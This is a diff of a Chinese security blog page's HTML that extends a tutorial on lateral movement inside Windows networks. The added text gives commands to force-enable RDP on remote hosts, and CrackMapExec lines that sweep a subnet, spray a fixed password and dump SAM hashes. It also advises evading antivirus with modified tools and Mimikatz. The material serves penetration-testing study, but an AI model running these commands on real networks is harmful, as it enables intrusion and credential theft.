@@ -4,17 +4,17 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
-<title>内网渗透：  横向渗透方法总结(未完结) - loecho</title>
+<title>内网渗透：  横向渗透方法总结 - loecho</title>
 <link rel="shortcut icon" href="https://1oecho.github.io/favicon.ico">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
 <link rel="stylesheet" href="https://1oecho.github.io/media/css/tailwind.css">
 <link rel="stylesheet" href="https://1oecho.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="内网渗透：  横向渗透方法总结(未完结) - loecho - Atom Feed" href="https://1oecho.github.io/atom.xml">
+<link rel="alternate" type="application/atom+xml" title="内网渗透：  横向渗透方法总结 - loecho - Atom Feed" href="https://1oecho.github.io/atom.xml">
 
     
 
-  <meta name="description" content="内网渗透：
+  <meta name="description" content="内网渗透： 横向渗透方法总结
 
 0x01 基本横向方法：
 
@@ -35,9 +35,9 @@ Dcom 远程执行
 
 
 Rdp 远程执行
-RDP配合代码执行进行横向渗透..." />
-  <meta property="og:title" content="内网渗透：  横向渗透方法总结(未完结) - loecho">
-  <meta property="og:description" content="内网渗透：
+RDP配合代..." />
+  <meta property="og:title" content="内网渗透：  横向渗透方法总结 - loecho">
+  <meta property="og:description" content="内网渗透： 横向渗透方法总结
 
 0x01 基本横向方法：
 
@@ -58,14 +58,14 @@ Dcom 远程执行
 
 
 Rdp 远程执行
-RDP配合代码执行进行横向渗透..." />
+RDP配合代..." />
   <meta property="og:type" content="articles">
   <meta property="og:url" content="https://1oecho.github.io/Net-6/" />
   <meta property="og:image" content="https://1oecho.github.io/images/avatar.png">
   <meta property="og:image:height" content="630">
   <meta property="og:image:width" content="1200">
-  <meta name="twitter:title" content="内网渗透：  横向渗透方法总结(未完结) - loecho">
-  <meta name="twitter:description" content="内网渗透：
+  <meta name="twitter:title" content="内网渗透：  横向渗透方法总结 - loecho">
+  <meta name="twitter:description" content="内网渗透： 横向渗透方法总结
 
 0x01 基本横向方法：
 
@@ -86,7 +86,7 @@ Dcom 远程执行
 
 
 Rdp 远程执行
-RDP配合代码执行进行横向渗透...">
+RDP配合代...">
   <meta name="twitter:card" content="summary_large_image">
   <link rel="canonical" href="https://1oecho.github.io/Net-6/">
 
@@ -110,15 +110,15 @@ RDP配合代码执行进行横向渗透...">
     <div class="max-w-4xl w-full mx-auto">
       <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
         <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
-          内网渗透：  横向渗透方法总结(未完结)
+          内网渗透：  横向渗透方法总结
         </h1>
         
         <div class="mb-8 flex flex-wrap">
-          <div class="text-gray-400 text-sm mr-4">2020-10-12 · 7 min read</div>
+          <div class="text-gray-400 text-sm mr-4">2020-10-12 · 9 min read</div>
           
         </div>
         <div class="markdown mb-8" v-pre>
-          <h1 id="内网渗透">内网渗透：</h1>
+          <h1 id="内网渗透-横向渗透方法总结">内网渗透： 横向渗透方法总结</h1>
 <figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200926082605.png" alt="1" loading="lazy"></figure>
 <h2 id="0x01-基本横向方法">0x01 基本横向方法：</h2>
 <table>
@@ -143,11 +143,11 @@ RDP配合代码执行进行横向渗透...">
 </tr>
 <tr>
 <td style="text-align:center">SSH 远程执行</td>
-<td style="text-align:center"></td>
+<td style="text-align:center">MSF配合命令执行进行横向渗透</td>
 </tr>
 <tr>
 <td style="text-align:center">Mssql 远程执行</td>
-<td style="text-align:center"></td>
+<td style="text-align:center">MSF配合Hash-dump模块，或者通过存储过程进行命令执行</td>
 </tr>
 <tr>
 <td style="text-align:center">Oracle 远程执行</td>
@@ -270,8 +270,8 @@ RDP配合代码执行进行横向渗透...">
 <p><strong>前提条件：</strong></p>
 <ul>
 <li>1.必须通过其他手段拿到本地或者域管理账号密码</li>
-<li>2.若在横向渗透过程中，要保证当前机器能net use远程到目标机器上</li>
-<li>3.目标机器开启了task scheduler服务,正常运行<code>Task Scheduler</code></li>
+<li>2.若在横向渗透过程中，要保证当前机器能<code>net use</code>远程到目标机器上</li>
+<li>3.目标机器开启了<code>task scheduler</code>服务,正常运行<code>Task Scheduler</code></li>
 </ul>
 <p><strong>具体步骤：</strong></p>
 <ul>
@@ -324,9 +324,6 @@ schtasks /delete /F /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&
 <li>2.若在域内环境横向渗透过程中，要保证当前机器获取了域管理员证书</li>
 </ul>
 <p><strong>具体步骤：</strong></p>
-<ul>
-<li></li>
-</ul>
 <h3 id="font-colorred-rdp-横向渗透font"><font color=REd>[+] RDP 横向渗透</font></h3>
 <p><strong>前提条件：</strong></p>
 <ul>
@@ -352,14 +349,14 @@ schtasks /delete /F /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&
 # 由此可以猜测主机内其他机器管理员密码情况，从而定点横向，从WEB到数据库从数据库到核心。。。。
 
 </code></pre>
-<h4 id="2-通过高权限用户配合高频密码进行横向rdp喷射">（2） 通过高权限用户配合高频密码进行横向RDP喷射</h4>
+<h4 id="2-通过高权限用户配合高密码进行横向rdp喷射">（2） 通过高权限用户配合高密码进行横向RDP喷射</h4>
 <ul>
 <li>
 <p>高权限域用户，Dump到明文密码，3389端口开启：</p>
 <ul>
 <li>RDP端口查看方式：</li>
 </ul>
-<pre><code># 通过注册表查询3389
+<pre><code class="language-powershell"># 通过注册表查询3389
 
 REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启
 
@@ -375,34 +372,73 @@ netstat -ano | find &quot;3220&quot; # 找到进程对应的端口号
 # 通过监听端口查看
 
 netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端口更改
+
+</code></pre>
+<ul>
+<li>
+<p>强开RDP端口方法:</p>
+<pre><code class="language-powershell"># 注册表开启，高权限用户：
+
+REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  # 监听 3389 端口
+
+# 注册表文件开启，高权限用户：
+
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+&quot;fDenyTSConnections&quot;=dword:00000000
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
+&quot;PortNumber&quot;=dword:00000d3d 
+
+# Wmic启动远程主机RDP服务：
+
+wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码
 </code></pre>
 </li>
 </ul>
-<pre><code>
-  - 强开RDP端口方法:
-
-    ```
-    # 注册表开启，高权限用户：
-    
-    REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
-    
-    REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  # 监听 3389 端口
-    
-    # 注册表文件开启，高权限用户：
-    
-    Windows Registry Editor Version 5.00
-    [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
-    &quot;fDenyTSConnections&quot;=dword:00000000
-    [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
-    &quot;PortNumber&quot;=dword:00000d3d 
-    
-    # Wmic启动远程主机RDP服务：
-    
-    wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码
-</code></pre>
-<ul>
-<li></li>
+</li>
+<li>
+<p>后续通过一些RDP爆破工具，进行爆破，前提是已经进行过<code>3389</code>端口的扫描得到结构,以免动静太大，效率太低！</p>
+</li>
 </ul>
+<h3 id="font-colorred-smb-横向渗透font"><font color=REd>[+] SMB 横向渗透</font></h3>
+<p><strong>前提条件：</strong></p>
+<ul>
+<li>1.获取到目标机器的明文密码/NTLM-Hash</li>
+<li>2.若在工作组内进行<code>SMB</code>的爆破，目标机器开启445端口，开启admin目录共享，以及<code>密码正确</code></li>
+</ul>
+<p><strong>常用方法：</strong></p>
+<ul>
+<li>1.基础的手动进行IPC连接，实现横向</li>
+<li>2.通过msf自带的<code>psexec</code> 模块进行横向</li>
+<li>3.通过<code>CrackMapexec</code>进行横向渗透</li>
+<li>4.通过计划任务进行<code>smb</code>的爆破，实现横向渗透</li>
+<li>5.目标开启<code>135</code>端口，通过<code>WMI</code>进行命令执行，实现横向</li>
+<li>6.通过powershll脚本实现PTH,进行横向渗透</li>
+</ul>
+<p><strong>基本步骤：</strong></p>
+<p><strong>工具地址：</strong></p>
+<p>https://github.com/maaaaz/CrackMapExecWin</p>
+<p>https://github.com/byt3bl33d3r/CrackMapExec</p>
+<p>以<code>CrackMapExec</code>为例,通常情况下，有Python版本的编译的exe版本，实战时要修改特征，如果要落地到目标机器，注意免杀！例子：工作组环境下的利用：</p>
+<ol>
+<li>首先先通过手中的机器,dump到Hash或者明文密码，为了效率问题，针对已知网段的<code>445</code>端口进行探测，保存结果：</li>
+</ol>
+<pre><code class="language-cmd">crackmapexec.exe -d . -t 10 172.16.0.0/16
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204104949.png" alt="image-20210204104949552" loading="lazy"></figure>
+<ol start="2">
+<li>探测后的结果，通过手中的密码/Hash去撞一下机器,顺便获取登陆成功后的机器的Hash，为后续做准备：</li>
+</ol>
+<pre><code class="language-cmd">for /f &quot;delims=&quot; %i in (C:\windows\temp\ip.txt) do @crackmapexec.exe -d . -u administrator -p ！QAZ@WSX 1 --sam %
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204110045.png" alt="image-20210204110045733" loading="lazy"></figure>
+<ol start="3">
+<li>筛选Hash后续进行，第二次传递，实战中可以通过计划任务，配合免杀的MimiKatz进行抓取明文密码：</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204110123.png" alt="image-20201213180319606" loading="lazy"></figure>
+<h3 id="font-colorred-smb-横向渗透font-2"><font color=REd>[+] SMB 横向渗透</font></h3>
 
         </div>
         <!-- Share to Twitter, Weibo, Telegram -->
@@ -450,7 +486,7 @@ netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端
       </div>
       <div class="post-toc-container">
         <ul class="markdownIt-TOC">
-<li><a href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">内网渗透：</a>
+<li><a href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">内网渗透： 横向渗透方法总结</a>
 <ul>
 <li><a href="#0x01-%E5%9F%BA%E6%9C%AC%E6%A8%AA%E5%90%91%E6%96%B9%E6%B3%95">0x01 基本横向方法：</a></li>
 <li><a href="#0x02-%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4">0x02 具体实现步骤</a>
@@ -460,9 +496,11 @@ netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端
 <li><a href="#font-colorred-rdp-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8Ffont"><font color=REd>[+] RDP 横向渗透</font></a>
 <ul>
 <li><a href="#1%E5%AF%86%E7%A0%81%E8%A7%84%E5%88%99%E7%8C%9C%E6%B5%8B%E6%88%96%E8%80%85%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9B%B4%E6%8E%A5%E6%92%9E3389%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83">（1）密码规则猜测，或者弱口令直接撞3389（工作组环境）</a></li>
-<li><a href="#2-%E9%80%9A%E8%BF%87%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E9%85%8D%E5%90%88%E9%AB%98%E9%A2%91%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91rdp%E5%96%B7%E5%B0%84">（2） 通过高权限用户配合高频密码进行横向RDP喷射</a></li>
+<li><a href="#2-%E9%80%9A%E8%BF%87%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E9%85%8D%E5%90%88%E9%AB%98%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91rdp%E5%96%B7%E5%B0%84">（2） 通过高权限用户配合高密码进行横向RDP喷射</a></li>
 </ul>
 </li>
+<li><a href="#font-colorred-smb-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8Ffont"><font color=REd>[+] SMB 横向渗透</font></a></li>
+<li><a href="#font-colorred-smb-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8Ffont-2"><font color=REd>[+] SMB 横向渗透</font></a></li>
 </ul>
 </li>
 </ul>
